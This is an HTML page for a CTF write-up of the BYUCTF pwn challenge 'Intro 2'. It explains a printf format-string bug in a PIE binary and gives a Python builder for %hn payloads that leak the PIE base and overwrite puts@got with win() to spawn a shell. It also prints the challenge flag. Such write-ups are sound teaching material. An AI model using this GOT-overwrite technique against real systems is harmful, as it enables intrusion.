@@ -1,0 +1,142 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" content="#080706">
+  <meta name="description" content="A PIE binary disguised as a rev chal. Both branches call printf(buf) with no format string. Leak the PIE base via %39$p, then a manual %hn GOT overwrite points puts@got at win(), and the very next puts() fires the shell.">
+  <meta property="og:type" content="article">
+  <meta property="og:site_name" content="0xAdham Field Notes">
+  <meta property="og:title" content="BYUCTF: Intro 2 · 0xAdham">
+  <meta property="og:description" content="A PIE binary disguised as a rev chal. Both branches call printf(buf) with no format string. Leak the PIE base via %39$p, then a manual %hn GOT overwrite points puts@got at win(), and the very next puts() fires the shell.">
+  <meta name="twitter:card" content="summary_large_image">
+  <title>BYUCTF: Intro 2 · 0xAdham</title>
+  <link rel="icon" type="image/svg+xml" href="/assets/mark.svg">
+  <link rel="stylesheet" href="/assets/site.css">
+</head>
+<body>
+  <header class="site-header">
+    <div class="wrap header-inner">
+      <a class="brand" href="/" aria-label="0xAdham Field Notes home">
+        <svg class="brand-mark" viewBox="0 0 40 40" aria-hidden="true"><path d="M10 4H4v32h6M30 4h6v32h-6" fill="none" stroke="currentColor" stroke-width="3"/><rect x="12" y="17" width="7" height="7" fill="currentColor"/><rect x="22" y="17" width="7" height="7" fill="#ff3428"/></svg>
+        <span class="brand-name">0xADHAM</span><span class="brand-note">Field notes / security research</span>
+      </a>
+      <button class="menu-toggle" type="button" aria-expanded="false" aria-controls="primary-nav">[ Menu ]</button>
+      <nav class="nav-links" id="primary-nav" aria-label="Main navigation">
+        <a href="/">Home</a><a href="/writing/" aria-current="page">Writing</a><a href="/research/">Research</a><a href="/about/">About</a>
+      </nav>
+    </div>
+  </header>
+  <main>
+    <div class="wrap article-header">
+      <div class="eyebrow"><span class="index">FIELD NOTE</span> CTF</div>
+      <h1 class="page-title">BYUCTF: Intro 2</h1>
+      <div class="article-byline">
+        <span>By Adham Mohammed / 0xAdham</span>
+        <span>2026-05-31</span>
+        <span>CTF</span>
+      </div>
+    </div>
+    <section class="section">
+      <div class="wrap content-layout">
+        <article class="prose">
+          <p><strong>Platform:</strong> BYUCTF<br />
+<strong>Challenge:</strong> Intro 2<br />
+<strong>Category:</strong> Pwn<br />
+<strong>Difficulty:</strong> Medium</p>
+<h2>Flag</h2>
+<p><code>byuctf{%p_yourself}</code></p>
+<h2>Target</h2>
+<p><code>&lt;remote-host&gt;:1367</code>. <code>dist.zip</code> → <code>intro</code> + Dockerfile (<code>pwn.red/jail</code>, <code>JAIL_TIME=60</code>).</p>
+<ul>
+<li>ELF 64-bit, <strong>PIE</strong>, NX on, not stripped. Imports <code>system</code> + <code>/bin/sh</code>; has <code>win()</code>.</li>
+<li>Disguised as a rev chal (embedded relic flag <code>byuctf{welcome_to_rev_fellas}</code> decodes via <code>memfrob</code>/XOR-0x2a in <code>flag_check</code>). The hint says solve it by <strong>pwning the remote</strong>. The rev flag isn't the real one.</li>
+</ul>
+<h2>Recon</h2>
+<p><code>win()</code> @ <code>0x53c</code> → <code>system("/bin/sh")</code> (sets up its own <code>/bin/sh</code>, so any redirected call = shell).</p>
+<p><code>main</code> loops up to 5 attempts:</p>
+<pre><code class="language-c">char buf[...];               // [rbp-0x70]
+char copy[...];              // [rbp-0xe0]
+scanf(&quot;%99s&quot;, buf);
+strcpy(copy, buf);
+if (flag_check(copy))   { printf(&quot;Correct! The flag is &quot;); printf(buf); ... }
+else                    { printf(&quot;Incorrect flag: &quot;);      printf(buf);   // &lt;-- VULN
+                          puts(&quot;Try again.&quot;); }             // &lt;-- trigger
+</code></pre>
+<p>Both branches call <strong><code>printf(buf)</code></strong> with no format string → <strong>format-string vulnerability</strong>, reachable just by sending a wrong flag. <code>%99s</code> and <code>strcpy</code> both stay in-frame (no stack overflow), so the format string is <em>the</em> bug.</p>
+<h2>Finding the offset &amp; leaks</h2>
+<p>Send <code>BBBBBBBB.%p.%p...</code>: the marker <code>0x4242424242424242</code> lands on the <strong>20th</strong> <code>%p</code> → format buffer is at <strong>arg offset 20</strong>. (Offsets 7 to 15 are the <code>strcpy</code> copy, mangled because <code>flag_check</code> runs <code>memfrob</code> on it in place.)</p>
+<p>Scanning deeper:</p>
+<ul>
+<li><strong><code>%39$p</code></strong> → pointer to <code>main</code> = <code>base + 0x5c9</code> ⇒ <strong>PIE base leak</strong>.</li>
+<li><code>%35$p</code> → a libc pointer (unused here).</li>
+</ul>
+<h2>Leak PIE, then GOT overwrite → win</h2>
+<p>Partial RELRO ⇒ GOT writable. <code>puts@got = base + 0x3018</code>. The plan fits the control flow perfectly: in the <em>Incorrect</em> branch, <strong><code>puts("Try again.")</code> is called immediately after the vulnerable <code>printf</code></strong>. So:</p>
+<ol>
+<li><strong>Attempt 1:</strong> send <code>%39$p</code>, leak <code>main</code>, compute <code>base</code>.</li>
+<li><strong>Attempt 2:</strong> format-string write <code>win</code> (<code>base+0x53c</code>) into <code>puts@got</code>. When the trailing <code>puts()</code> fires, it jumps to <code>win</code> → <code>system("/bin/sh")</code>.</li>
+</ol>
+<p><strong>Payload construction (manual, fits in 99 bytes):</strong></p>
+<ul>
+<li>Write the low <strong>6 bytes</strong> of <code>win</code> as three <code>%hn</code> shorts to <code>puts_got</code>, <code>+2</code>, <code>+4</code> (the top 2 bytes are <code>0x0000</code>, same as the original entry, so skip them).</li>
+<li>64-bit target addresses contain null bytes, so place all addresses <strong>after</strong> every format directive. <code>scanf("%99s")</code> happily reads embedded nulls (only whitespace stops it); <code>printf</code> executes all <code>%hn</code> writes <em>before</em> hitting the first null in the address block and stopping. Order the shorts ascending so the cumulative <code>%c</code> widths chain.</li>
+<li>Reject payloads where the (ASLR-dependent) address bytes contain whitespace (<code>0x20/09/0a</code>) and reconnect. Rare.</li>
+</ul>
+<pre><code class="language-python">def make_payload(addr, value, start_off=20, cap=99):
+    shorts  = [value &amp; 0xffff, (value&gt;&gt;16)&amp;0xffff, (value&gt;&gt;32)&amp;0xffff]
+    targets = [addr, addr+2, addr+4]
+    writes  = sorted(zip(shorts, targets))          # ascending by value
+    for addr_off in range(start_off+1, start_off+9):
+        d, printed = b'', 0
+        for i,(val,_) in enumerate(writes):
+            delta = (val - printed) % 0x10000
+            if delta: d += b'%%%dc' % delta
+            d += b'%%%d$hn' % (addr_off+i)
+            printed = val
+        region = (addr_off - start_off) * 8
+        if len(d) &lt;= region:
+            pay = d + b'A'*(region-len(d)) + b''.join(p64(t) for _,t in writes)
+            if len(pay) &lt;= cap and not any(b in pay for b in b' \t\n\x0b\x0c'):
+                return pay
+
+# flow: recv banner -&gt; send b'%39$p' -&gt; base = leak-0x5c9
+#       -&gt; send make_payload(base+0x3018, base+0x53c) -&gt; puts() -&gt; win -&gt; shell
+#       -&gt; cat /app/flag.txt
+</code></pre>
+<p>Result: <code>base 0x559956339000 … PWNED_1000 … byuctf{%p_yourself}</code> (flag at <code>/app/flag.txt</code>).</p>
+<h2>Takeaways</h2>
+<ul>
+<li><code>printf(user_buf)</code> is the bug even when a fixed-format <code>printf("%s", buf)</code> sits right next to it. Check every <code>printf</code> for a missing format string.</li>
+<li><strong>PIE fmtstr workflow:</strong> first leak a binary pointer (here <code>%39$p</code> → <code>main</code>) to recover the base, <em>then</em> write. One leak deterministically beats brute-forcing a partial overwrite (1/16 on the ASLR nibble).</li>
+<li><strong>GOT overwrite beats return-address overwrite here</strong> because a call to the target (<code>puts</code>) happens <em>in the same branch, right after</em> the vulnerable <code>printf</code>. Instant, deterministic trigger, no need to unwind the 5-attempt loop.</li>
+<li>Null bytes in format-string addresses are fine if placed after all directives: <code>scanf("%s")</code> reads nulls; <code>printf</code> does the <code>%hn</code> writes before it stops at the null.</li>
+<li>A <code>win()</code> that loads its own argument means you only need to redirect <em>one</em> call. No register control required.</li>
+</ul>
+<p><em>0xAdham</em></p>
+        </article>
+        <aside class="article-aside">
+          <div class="eyebrow"><span class="index">FIELD NOTE</span> Details</div>
+          <h2>Clear. Scoped. Reproducible.</h2>
+          <p>A PIE binary disguised as a rev chal. Both branches call printf(buf) with no format string. Leak the PIE base via %39$p, then a manual %hn GOT overwrite points puts@got at win(), and the very next puts() fires the shell.</p>
+          <div style="margin: 20px 0; padding-top: 16px; border-top: 1px solid var(--line); font-size: 13px; font-family: var(--mono); color: var(--muted); line-height: 1.8;">
+            <div><strong style="color:var(--ink)">Published:</strong> 2026-05-31</div>
+            <div><strong style="color:var(--ink)">Category:</strong> CTF</div>
+            <div style="margin-top:10px"><strong style="color:var(--ink)">Tags:</strong><div style="margin-top:5px"><span class="tag" style="display:inline-block;margin:2px 4px 2px 0;padding:2px 7px;background:var(--panel-2);border:1px solid var(--line);border-radius:2px;font-size:11px">ctf</span><span class="tag" style="display:inline-block;margin:2px 4px 2px 0;padding:2px 7px;background:var(--panel-2);border:1px solid var(--line);border-radius:2px;font-size:11px">pwn</span><span class="tag" style="display:inline-block;margin:2px 4px 2px 0;padding:2px 7px;background:var(--panel-2);border:1px solid var(--line);border-radius:2px;font-size:11px">format-string</span><span class="tag" style="display:inline-block;margin:2px 4px 2px 0;padding:2px 7px;background:var(--panel-2);border:1px solid var(--line);border-radius:2px;font-size:11px">got-overwrite</span><span class="tag" style="display:inline-block;margin:2px 4px 2px 0;padding:2px 7px;background:var(--panel-2);border:1px solid var(--line);border-radius:2px;font-size:11px">pie</span><span class="tag" style="display:inline-block;margin:2px 4px 2px 0;padding:2px 7px;background:var(--panel-2);border:1px solid var(--line);border-radius:2px;font-size:11px">info-leak</span><span class="tag" style="display:inline-block;margin:2px 4px 2px 0;padding:2px 7px;background:var(--panel-2);border:1px solid var(--line);border-radius:2px;font-size:11px">byuctf</span></div></div>
+          </div>
+          <a class="button" href="/writing/">Back to archive <span class="arrow" aria-hidden="true">←</span></a>
+        </aside>
+      </div>
+    </section>
+  </main>
+  <footer class="site-footer">
+    <div class="wrap">
+      <div class="footer-bottom">
+        <span>© 2026 · 0xAdham</span>
+        <a href="/writing/">Return to writing ↑</a>
+      </div>
+    </div>
+  </footer>
+  <script src="/assets/site.js" defer></script>
+</body>
+</html>
